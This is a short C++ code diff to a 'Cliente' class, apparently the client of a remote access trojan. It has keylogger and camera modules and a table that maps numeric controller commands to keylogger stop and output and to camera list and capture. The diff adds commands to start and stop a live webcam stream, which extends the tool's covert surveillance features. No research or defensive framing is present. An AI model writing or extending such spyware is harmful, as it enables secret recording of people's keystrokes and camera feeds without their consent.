@@ -24,7 +24,6 @@ class Cliente {
 		mod_Keylogger* mod_Key = nullptr;
 		mod_Camera* mod_Cam = nullptr;
 
-		int iCAMCOUNT = 0;
 		//Para recibir archivo (single)
 		FILE *fpArchivo = nullptr;
 		
@@ -61,7 +60,9 @@ class Cliente {
 			{"530", EnumComandos::KL_Detener},
 			{"531", EnumComandos::KL_Salida},
 			{"532", EnumComandos::CM_Lista},
-			{"534", EnumComandos::CM_Single}
+			{"534", EnumComandos::CM_Single},
+			{"536", EnumComandos::CM_Live_Start},
+			{"537", EnumComandos::CM_Live_Stop}
 
 		};
 
